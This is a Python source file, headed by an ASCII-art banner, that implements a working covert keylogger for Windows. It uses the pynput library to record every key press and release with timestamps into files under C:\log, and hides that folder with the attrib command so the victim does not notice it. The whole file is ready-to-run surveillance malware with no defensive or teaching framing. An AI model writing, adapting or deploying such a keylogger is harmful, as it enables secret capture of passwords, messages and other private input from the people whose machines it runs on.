#############################################################################################################################################################################
#                                                                                                                                                                           #
#   @@@@@@@    @@@@@@    @@@@@@   @@@  @@@  @@@@@@@@  @@@  @@@  @@@          @@@@@@@    @@@@@@   @@@  @@@   @@@@@@   @@@@@@@   @@@@@@@  @@@   @@@@@@@   @@@@@@   @@@  @@@   #
#   @@@@@@@@  @@@@@@@@  @@@@@@@   @@@  @@@  @@@@@@@@  @@@  @@@  @@@          @@@@@@@@  @@@@@@@@  @@@@ @@@  @@@@@@@@  @@@@@@@@  @@@@@@@  @@@  @@@@@@@@  @@@@@@@@  @@@@ @@@   #
#   @@!  @@@  @@!  @@@  !@@       @@!  @@@  @@!       @@!  @@@  @@!          @@!  @@@  @@!  @@@  @@!@!@@@  @@!  @@@  @@!  @@@    @@!    @@!  !@@       @@!  @@@  @@!@!@@@   #
#   !@   @!@  !@!  @!@  !@!       !@!  @!@  !@!       !@!  @!@  !@!          !@!  @!@  !@!  @!@  !@!!@!@!  !@!  @!@  !@!  @!@    !@!    !@!  !@!       !@!  @!@  !@!!@!@!   #
#   @!@!@!@   @!@!@!@!  !!@@!!    @!@!@!@!  @!!!:!    @!@  !@!  @!!          @!@@!@!   @!@!@!@!  @!@ !!@!  @!@  !@!  @!@@!@!     @!!    !!@  !@!       @!@  !@!  @!@ !!@!   #
#   !!!@!!!!  !!!@!!!!   !!@!!!   !!!@!!!!  !!!!!:    !@!  !!!  !!!          !!@!!!    !!!@!!!!  !@!  !!!  !@!  !!!  !!@!!!      !!!    !!!  !!!       !@!  !!!  !@!  !!!   #
#   !!:  !!!  !!:  !!!       !:!  !!:  !!!  !!:       !!:  !!!  !!:          !!:       !!:  !!!  !!:  !!!  !!:  !!!  !!:         !!:    !!:  :!!       !!:  !!!  !!:  !!!   #
#   :!:  !:!  :!:  !:!      !:!   :!:  !:!  :!:       :!:  !:!   :!:         :!:       :!:  !:!  :!:  !:!  :!:  !:!  :!:         :!:    :!:  :!:       :!:  !:!  :!:  !:!   #
#    :: ::::  ::   :::  :::: ::   ::   :::   ::       ::::: ::   :: ::::      ::       ::   :::   ::   ::  ::::: ::   ::          ::     ::   ::: :::  ::::: ::   ::   ::   #
#   :: : ::    :   : :  :: : :     :   : :   :         : :  :   : :: : :      :         :   : :  ::    :    : :  :    :           :     :     :: :: :   : :  :   ::    :    #
#                                                                                                                                                                           #
#############################################################################################################################################################################

# Import necessary packages
import os
import datetime
import subprocess
from pynput import keyboard

# Define directory paths and filenames
loggingPath = "C:\\log\\"
keystrokeLog = "log1.txt"
dateTimeLog = "log2.txt"

# Define formating variables for logging
defaultFmt = "%0s%10s"
pressFmt = "%0s%40s%25s"
releaseFmt = "%0s%38s%25s"

# If the directory we will output the keystrokes to doesn't exist, create it.
if not os.path.exists(loggingPath):
    os.makedirs(loggingPath)

# Hide the log directory and files that hold the keystrokes
subprocess.check_call(["attrib", "+H", "C:\\log"])

# Open a file called 'log' and write to it. If it isn't there, create it.
openKeystrokeLog = open(os.path.join(loggingPath, keystrokeLog), 'w+')
openDateTimeLog = open(os.path.join(loggingPath, dateTimeLog), 'w+')
openDateTimeLog.write(defaultFmt % ("Press/Release:", "Time:\n"))


# This function logs key presses.
def on_press(key):
    try:
        openKeystrokeLog.write(str(key.char))
        openDateTimeLog.write(pressFmt % ("Press", str(datetime.datetime.now()), str(key.char) + "\n"))
    except AttributeError:
        openKeystrokeLog.write(" {" + str(key) + "} ")
        openDateTimeLog.write(pressFmt % ("Press", str(datetime.datetime.now()), " {" + str(key) + "}\n",))


# This function logs key releases.
def on_release(key):
    try:
        openDateTimeLog.write(releaseFmt % ("Release", str(datetime.datetime.now()), str(key.char) + "\n"))
    except AttributeError:
        openDateTimeLog.write(releaseFmt % ("Release", str(datetime.datetime.now()), " {" + str(key) + "}\n",))
    if key == keyboard.Key.esc:
        openKeystrokeLog.close()
        return False


# This code uses the keyboard listener.
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
